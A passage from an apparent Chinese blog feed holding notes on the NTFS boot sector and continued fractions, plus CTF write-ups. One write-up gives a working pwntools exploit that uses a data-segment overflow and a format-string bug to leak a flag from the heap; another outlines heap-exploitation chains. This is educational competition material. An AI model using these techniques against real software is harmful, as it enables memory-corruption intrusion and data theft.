src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251220035326336.png" alt="image-20251220035326336"></p><ul><li>接下来直接列出NTFS中DBR扇区的数据结构：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NTFSDBR</span>&#123;</span></span><br><span class="line">    BYTE JMP[<span class="number">3</span>];  <span class="comment">// 0x0~0x2 跳转指令</span></span><br><span class="line">    BYTE FsID[<span class="number">8</span>]; <span class="comment">// 0x3~0xA NTFS\x20\x20\x20x\20</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> bytePerSector;  <span class="comment">// 0xB~0xC 每个扇区的字节数</span></span><br><span class="line">    BYTE secPerCluster;  <span class="comment">// 0xD 每个簇的扇区数</span></span><br><span class="line">    BYTE reservedBytes[<span class="number">2</span>];  <span class="comment">// 0xE~0xF 保留扇区 </span></span><br><span class="line">    BYTE zeroBytes[<span class="number">3</span>];  <span class="comment">// 0x10~0x12 保留字段,3个字节都是0</span></span><br><span class="line">    BYTE unusedBytes1[<span class="number">2</span>]; <span class="comment">// 0x13~0x14 两个未使用字节</span></span><br><span class="line">    BYTE mediaType;  <span class="comment">// 0x15 媒体类型, 0xF8是固定磁盘,0xF0是软盘</span></span><br><span class="line">    BYTE unusedBytes2[<span class="number">2</span>];  <span class="comment">// 0x16~0x17 两个未使用的字节</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> secPerTrack; <span class="comment">// 0x18~0x19 每磁道扇区数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Heads;  <span class="comment">// 0x1A~0x1B  磁头数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> hideSectors;  <span class="comment">// 0x1C~0x0x1F 隐藏扇区数</span></span><br><span class="line">    BYTE unusedByte3[<span class="number">4</span>];  <span class="comment">// 0x20~0x23 未使用字节数</span></span><br><span class="line">    BYTE usedBytes[<span class="number">4</span>];  <span class="comment">// 0x24~0x27 4个固定字节</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 totalSectors; <span class="comment">// 0x28~0x2F 总扇区数</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 MFT;  <span class="comment">// 0x30~0x37 MFT文件起始簇号</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 MFTMirror; <span class="comment">// 0x38~0x3F MFTMirror文件起始簇号</span></span><br><span class="line">    <span class="type">char</span> fileRecord;  <span class="comment">// 0x40 文件记录,单个MFT文件记录的大小</span></span><br><span class="line">    BYTE unusedBytes4[<span class="number">3</span>]; <span class="comment">// 0x41~0x43 未使用字节数</span></span><br><span class="line">    <span class="type">char</span> indexSize;  <span class="comment">// 0x44 索引缓冲区大小</span></span><br><span class="line">    BYTE unusedBytes5[<span class="number">4</span>];  <span class="comment">// 0x45~0x48 未使用字节数</span></span><br><span class="line">    BYTE volumeSerialID64[<span class="number">8</span>]; <span class="comment">// 0x49~0x4F 卷序列号</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> checksum;  <span class="comment">// 0x50~0x53 校验和</span></span><br><span class="line">    BYTE bootCode[<span class="number">426</span>];  <span class="comment">// 0x54~0x1FD 引导代码</span></span><br><span class="line">    BYTE endSignature[<span class="number">2</span>]; <span class="comment">// 0x1FE~0x1FF 结束标志</span></span><br><span class="line">&#125;NTFSDBR, *pNTFSDBR;</span><br></pre></td></tr></table></figure><h3 id="ntfs的mft"><a href="#NTFS的MFT" class="headerlink" title="NTFS的MFT"></a>NTFS的MFT</h3><ul><li>对于<code>NTFS</code>的MFT区域，这里给出一个比较详细的图片，对每个元数据有个大致的把握，再来逐个元数据研究。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215003015689.png" alt="image-20251215003015689"></p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3>]]></content>
    
    
    <summary type="html">前言：全面理解一下磁盘的一些格式，顺便突击一下取证期末。</summary>
    
    
    
    <category term="开发" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    <category term="UEFI开发" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/UEFI%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>数论基础-连分数</title>
    <link href="http://iyheart.github.io/2025/12/04/%E6%95%B0%E5%AD%A6blog/%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80-%E8%BF%9E%E5%88%86%E6%95%B0/"/>
    <id>http://iyheart.github.io/2025/12/04/%E6%95%B0%E5%AD%A6blog/%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80-%E8%BF%9E%E5%88%86%E6%95%B0/</id>
    <published>2025-12-04T13:30:03.000Z</published>
    <updated>2025-12-04T13:31:58.961Z</updated>
    
    <content type="html"><![CDATA[<p>引入：在小学的时候已经学习了分数，并且我们知道$\frac{6}{7}$是真分数，$\frac{10}{7}$是假分数，$1\frac{3}{7}$是带分数，而$\frac{\frac{5}{11}}{\frac{3}{2}}$是繁分数。而将这些组合起来构成一个新的分数，这种分数被称为<strong>连分数</strong>。形式如下，但是研究的时候只研究$b_1=b_2=….=b_n=1$这一情况：</p><script type="math/tex; mode=display">a_1+\frac{b_1}{a_2+\frac{b_2}{a_3+\frac{b_3}{a_4+...}}}</script><h1 id="连分数的基本性质"><a href="#连分数的基本性质" class="headerlink" title="连分数的基本性质"></a>连分数的基本性质</h1><blockquote><p><strong>定义1</strong>：（连分数）</p><p>形如如下形式的分数就被称为<strong>连分数</strong>，但是这种写法比较繁琐，所以就使用$[a_1,a_2,…,a_n]$来表示如下形式的连分数，由于$b_1=b_2=…=b_n=1$因此不用关注$b$</p><script type="math/tex; mode=display">a_1+\frac{1}{a_2+\frac{1}{a_3+\frac{1}{\ddots+\frac{1}{a_n}}}}</script><p>例子：将$\frac{29}{67}$转换为连分数的形式。</p><ul><li>首先将$\frac{29}{67}$取倒数$0+\frac{1}{\frac{67}{29}}$，此时就是一个假分数，将假分数转换为带分数$0+\frac{1}{2\frac{9}{29}}$。</li><li>此时将这个倒数后的带分数，给个加号就变成$0+\frac{1}{2+\frac{9}{29}}$</li><li>之后继续上面两步的操作$0+\frac{1}{2+\frac{1}{3+\frac{2}{9}}}$</li><li>继续前两步的操作，直到分子分子都是1，得到$0+\frac{1}{2+\frac{1}{3+\frac{1}{4+\frac{1}{2}}}}$</li><li>最后使用符号表示$[0,2,3,4,2]$</li></ul><p>注解：连分数为什么会与初等数论有关系呢？由上面的例子发现，在求连分数的时候会发现，我们一直都是在做带余除法，并且是<strong>辗转相除法</strong>。此时发现，使用符号表示连分数刚好使用的是辗转相除法得到的<strong>商</strong>表示的。</p><script type="math/tex; mode=display">29=\mathbf{0}*67+29\\67=\mathbf{2}*29+9\\29=\mathbf{3}*9+2\\9=\mathbf{4}*2+1\\2=\mathbf{2}*1+0</script><p><strong>定义2</strong>：</p><p>$[a_1,a_2,…,a_k]=\frac{p_k}{q_k}$叫做$a_1+\frac{1}{a_2+\frac{1}{a_3+\frac{1}{\ddots+\frac{1}{a_n}}}}$的第<code>k</code>个<strong>渐进连分数</strong>。</p><p>注解1：<strong>渐进连分数</strong>其实就是在研究连分数的一部分，比如$[a_1]$是上式第一个渐进连分数其为$a_1$；$[a_1,a_2]$是上式第二个渐进连分数其为$a_1+\frac{1}{a_2}$；第$k$个渐进连分数以此类推。</p><p>注解2：$\frac{p<em>k}{q_k}$是关于$a_1,a_2,…,a_k$的函数，且与$a</em>{k+1},a_{k+2},…,a_n$无关。并且可以得到$\frac{p_1}{q_1}=\frac{a_1}{1}$，$\frac{p_2}{q_2}=a_1+\frac{1}{a_2}=\frac{a_1a_2+1}{a_2}$，$\frac{p_3}{q_3}=a_1+\frac{1}{a_2+\frac{1}{a_3}}=\frac{a_3(a_2a_1+1)+a_1}{a_3a_2+1}$</p><p><strong>定理1</strong>：</p><p>若连分数$[a_1,a_2,…,a_n]$的渐进分数是$\frac{p_1}{q_1},\frac{p_2}{q_2},…,\frac{p_n}{q_n}$则在这些渐进连分数之间满足递推关系：</p><script type="math/tex; mode=display">\begin{array}{l}p_1=a_1,~~~p_2=a_2a_1+1,~~~p_k=a_kp_{k-1}+p_{k-2}\\q_1=1,~~~~~q_2=a_1,~~~~~~~~~~~~~~~q_k=a_kq_{k-1}+q_{k-2}\end{array}</script><p>注解：这里默认连分数存在，如果$a_2=0$，则会出现$\frac{p_2}{q_2}$不存在，</p><p><strong>定理2</strong>：</p><p>若连分数$[a_1,a_2,…,a_n]$的n个渐近连分数是$\frac{p_k}{q_k},k=1,2,…,n$则下列两关系成立：</p><script type="math/tex; mode=display">p_kq_{k-1}-p_{k-1}q_{k}=(-1)^{k},k≥2\\p_kq_{k-2}-p_{k-2}q_k=(-1)^{k-1}a_k,~k≥3</script><p><strong>定义3</strong>：（简单连分数、有限简单连分数，无限简单连分数，连分数的值）</p><p>若$a_1$是整数，$a_2,a_3,…,a_k,…$是正整数，则连分数$[a_1,a_2,…,a_k,….]$叫做<strong>简单连分数</strong>。</p><p>若简单连分数中$a$的个数有限，则被叫做<strong>有限简单连分数</strong>。</p><p>若简单连分数中$a$的个数无限，则被叫做<strong>无限简单连分数</strong></p><p>对于<strong>无限简单连分数</strong>，仍然规定$\frac{p_k}{q_k}=<a href="k=1,2,...">a_1,a_2,…,a_k</a>$是它的渐近分数，又如当$k\rightarrow \infty$时$\frac{p_k}{q_k}$有一个极限，我们就把这一极限叫做<strong>连分数的值</strong></p><p><strong>定理3</strong>：</p><p>设$[a_1,a_2,…,a_n,…]$是(有限或无限的)简单连分数，$\frac{p_k}{q_k}(k=1,2,…)$是它的渐近分数，则：</p><ol><li>当$k≥3$时，$q<em>k≥q</em>{k-1}+1$，因而对任何$k$来说，$q_k≥k-1$；</li><li>$\frac{p<em>{2(k-1)}}{q</em>{2(k-1)}}&gt;\frac{p<em>{2k}}{q</em>{2k}}$，$\frac{p<em>{2k-1}}{q</em>{2k-1}}&gt;\frac{p<em>{2k-3}}{q</em>{2k-3}}$，$\frac{p<em>{2k}}{q</em>{2k}}＞\frac{p<em>{2k-1}}{q</em>{2k-1}}$；</li><li>$\frac{p_k}{q_k}(k=1,2,…)$都是既约分数。</li></ol><p><strong>定理4</strong>：</p><p>每一简单连分数表示一个实数</p></blockquote><h1 id="实数表成连分数"><a href="#实数表成连分数" class="headerlink" title="实数表成连分数"></a>实数表成连分数</h1><h1 id="循环连分数"><a href="#循环连分数" class="headerlink" title="循环连分数"></a>循环连分数</h1>]]></content>
    
    
    <summary type="html">前言：无</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="数论" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E6%95%B0%E8%AE%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>LILCTF2025-wp</title>
    <link href="http://iyheart.github.io/2025/12/02/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/LILCTF2025-wp/"/>
    <id>http://iyheart.github.io/2025/12/02/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/LILCTF2025-wp/</id>
    <published>2025-12-02T10:18:54.000Z</published>
    <updated>2025-12-02T15:50:36.430Z</updated>
    
    <content type="html"><![CDATA[<h1 id="crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><ul><li>本次密码题感觉偏简单，我就做了个<code>baaaaaag</code>，赛后复现一下其他题目。然而<code>baaaaaag</code>这个题目其实也算是背包造格的模版题目。</li><li>听说这个要像<code>LitCTF</code>的那个背包密码一样爆破个几位，但是用<code>BKZ()</code>规约就能秒，应该算是非预期了吧。</li></ul><h2 id="baaaaaag"><a href="#baaaaaag" class="headerlink" title="baaaaaag"></a>baaaaaag</h2><h1 id="re"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="arm-asm"><a href="#ARM-ASM" class="headerlink" title="ARM-ASM"></a>ARM-ASM</h2><ul><li>这道题其实算是比较简单的，并且自从有了<code>IDA 9.0</code>，支持其他架构的反编译后对于<code>ARM</code>的逆向会更容易。但是这题开赛的时候卡了一天了，当时没有注意到自定义的<code>base64</code>编码QAQ，要不然第一天牢完这题还有时间牢别的题目的。</li></ul><h1 id="pwn"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="heap-pivoting"><a href="#heap-Pivoting" class="headerlink" title="heap-Pivoting"></a>heap-Pivoting</h2><ul><li>这题我做的方式并不是预期解，有用到爆破。接下来先说明一下我做的题目思路。（当时六级查分是真睡不着，就通宵打打了。）</li></ul><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><ul><li><p>大致思路是这样的：</p><ul><li>该附件是静态编译的附件，而静态编译的该附件在可读可写段也保存着<code>main_arena</code>、<code>free_hook</code>、<code>malloc_hook</code>，所以还是不太需要打IO结构体</li><li>先确定好这些变量的地址，之后使用<code>unsorted_bin_attack</code>去打<code>global_max_fast</code></li><li>再使用<code>fastbin_double_free</code>将堆块申请到存放堆地址的数组上（这部分需要利用堆地址随机偏移为<code>0x11*</code>才能申请到该地址，这个就需要爆破了但是当时爆破了2小时才出来QAQ，本地的话其实很快就能爆破出来的。）</li><li>最后就是打<code>free_hook</code>，由于开启了沙箱就需要使用<code>orw</code>的方式，并且打<code>free_hook</code>需要将<code>rsp</code>指针从栈上迁移到堆上，在堆上写rop链。这里选用的<code>gad_get</code>是<code>xchg esp,edi;</code></li></ul></li><li><p>先来查看一下附件，会发现</p></li></ul><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><ul><li>解法2应该是预期解法了，看别人博客是这样写的。<ul><li>使用<code>unsorted_bin_attack</code>打存放堆地址的数组，这样就可以直接编辑<code>main_arena</code></li><li>修改<code>main_arena</code>这个地址中的<code>top_chunk</code>，将<code>top_chunk</code>的值该到存放堆地址的数组上</li><li>最后就是打<code>free_hook</code>与解法1的最后一步是一样的。</li></ul></li></ul>]]></content>
    
    
    <summary type="html">前言：菜就多练，LiL题目质量还是很高的</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>2025-强网杯S9-wp</title>
    <link href="http://iyheart.github.io/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/"/>
    <id>http://iyheart.github.io/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/</id>
    <published>2025-11-26T01:19:44.000Z</published>
    <updated>2025-12-02T15:44:02.170Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="flag-market复现"><a href="#flag-market-复现" class="headerlink" title="flag-market(复现)"></a>flag-market(复现)</h2><p>这类对flag文件读取的题目之前在<code>susctf</code>，这边做到过一题也是简单的溢出类题型，但是这次牢不动了。溢出点找出来了，flag残留在堆上也找出来了，就是没看出来溢出后可以利用printf那边的格式化字符串漏洞泄露flag。</p><h3 id="flag-market分析"><a href="#flag-market分析" class="headerlink" title="flag-market分析"></a>flag-market分析</h3><ul><li>先查看一下保护机制，发现<code>没有开PIE</code>。</li></ul><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126102506799.png" alt="image-20251126102506799"></p><ul><li>接下来就是运行一下这个程序，算是一个循环菜单题，但是这个菜单只有两个选项。</li></ul><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126102554502.png" alt="image-20251126102554502"></p><ul><li>接下来逆向一下这个程序，首选发现了一个关键点，我们输入选项<code>1</code>，使用<code>255</code>购买flag就会使得程序输出flag。</li></ul><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126103450642.png" alt="image-20251126103450642"></p><ul><li>但是触发了这个输出flag功能，其实没啥用处，因为遇到<code>&#123;</code>就不会再将flag输出下去了，并且在逐个输出flag之前程序已经将<code>flag</code>这个文件描述符给关闭了。</li></ul><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126103659067.png" alt="image-20251126103659067"></p><ul><li>尝试运行的时候会出现这样的情况，发现还有一个输入点</li></ul><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126103737412.png" alt="image-20251126103737412"></p><ul><li>接着继续逆向这个程序，发现这个输入点存在<code>scanf</code>的一个溢出漏洞，可以实现<code>.data</code>段溢出。</li></ul><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126103928085.png" alt="image-20251126103928085"></p><ul><li>然后注意到上面存在一个<code>printf</code>函数，并且<code>scanf</code>输入的时候可以溢出修改<code>format</code>，这样很可能就是一个字符串格式化漏洞。</li></ul><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126104103071.png" alt="image-20251126104103071"></p><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126104219660.png" alt="image-20251126104219660"></p><h3 id="flag-market调试"><a href="#flag-market调试" class="headerlink" title="flag-market调试"></a>flag-market调试</h3><ul><li>接下来调试一下，先看看是否能溢出修改<code>format</code>那边的字符串。</li></ul><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126104649134.png" alt="image-20251126104649134"></p><ul><li>发现<code>format</code>那边的字符串是已经因为溢出而被修改了。</li></ul><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126104750477.png" alt="image-20251126104750477"></p><ul><li>接下来其实可以利用字符串格式化漏洞直接输出flag，但是flag存放在什么位置呢，接下来我们要寻找一下，由于flag直接会存放在栈上，现在我们看看栈上的flag还存不存在。其实栈上的flag不会存在的，因为在出现<code>error</code>的时候会先将<code>v9</code>清零。</li></ul><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126105037753.png" alt="image-20251126105037753"></p><ul><li>接下来需要看看哪里还存放着flag，由于我们知道前面是有打开flag文件，需要添加一个<code>IO_FILE</code>结构体，而这个结构体需要用堆存放，这个时候我们来看看堆。果然，堆上有flag的残留数据，所以我们需要泄露的是堆上的这个字符串。</li></ul><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126105153622.png" alt="image-20251126105153622"></p><ul><li>由于地址随机偏移的问题，程序每次运行时堆地址都不是固定的，所以我们要看看能不能先泄露出堆地址（所以先要使用printf先泄露堆地址），看看栈上是否有存放堆地址，发现栈上是存在堆地址的。</li><li>并且在printf输出的这个位置<code>rsp</code>的地址比存放<code>堆地址</code>的栈地址更低</li></ul><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126105410645.png" alt="image-20251126105410645"></p><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126105612316.png" alt="image-20251126105611619"></p><ul><li>这样就可以先使用<code>%9$p</code>将堆地址给泄露出来。但是还存在一个问题，我们只能利用<code>1</code>次scanf溢出，所以这次溢出还需要输入<code>%xxx$s</code>。</li></ul><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126105816511.png" alt="image-20251126105816511"></p><ul><li>接下来就需要调试栈上哪个地址是有效的保存字符串的地址，以便我们在第一次printf触发格式化字符串漏洞的时候<code>%xx$s</code>不会导致程序崩溃，但是栈上发现没有什么有效地址。但是发现``</li></ul><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126111034533.png" alt="image-20251126111034533"></p><ul><li>但是发现这个地方我们是可以直接控制的，可以直接输入一个地址，使得<code>printf</code>触发<code>%xx$s</code>的时候不会导致程序崩溃。并且在泄露地址之后我们还可以将这个地址修改为<code>flag</code>所存放的堆地址，非常巧妙。</li></ul><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126111127204.png" alt="image-20251126111127204"></p><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126111245691.png" alt="image-20251126111245691"></p><h3 id="flag-market-exp"><a href="#flag-market-EXP" class="headerlink" title="flag-market-EXP"></a>flag-market-EXP</h3><p>就直接按照上面调试的思路去编写exp即可</p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;0.0.0.0&#x27;,7122)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;255&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x4041C0</span>-<span class="number">0x4040C0</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*offset+<span class="string">b&#x27;%9$p%12$s&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(p64(<span class="number">0x4040C0</span>))</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">b&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%9$p%12$s&#x27;</span></span><br><span class="line">heap_addr = p.recvline()[:-<span class="built_in">len</span>(<span class="string">b&#x27;welcome to flag market!\n&#x27;</span>)-<span class="built_in">len</span>(<span class="built_in">str</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] heap_addr:&#x27;</span>,heap_addr)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(heap_addr,<span class="number">16</span>)</span><br><span class="line">flag_addr = heap_addr + <span class="number">0x1E0</span></span><br><span class="line"><span class="comment"># 0xe7c480</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] flag_addr&#x27;</span>,<span class="built_in">hex</span>(flag_addr))</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(p64(flag_addr))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251126111530847.png" alt="image-20251126111530847"></p><h2 id="ez-stack复现"><a href="#ez-stack-复现" class="headerlink" title="ez-stack(复现)"></a>ez-stack(复现)</h2><h3 id="ez-stack分析"><a href="#ez-stack分析" class="headerlink" title="ez-stack分析"></a>ez-stack分析</h3><h3 id="ez-stack调试"><a href="#ez-stack调试" class="headerlink" title="ez-stack调试"></a>ez-stack调试</h3><h3 id="ez-stack-exp"><a href="#ez-stack-EXP" class="headerlink" title="ez-stack-EXP"></a>ez-stack-EXP</h3><h1 id="crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="check-little复现"><a href="#check-little-复现" class="headerlink" title="check-little(复现)"></a>check-little(复现)</h2><ul><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从文件中导入flag和key</span></span><br><span class="line">flag, key = <span class="built_in">open</span>(<span class="string">&#x27;secret&#x27;</span>).read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 小指数加密</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 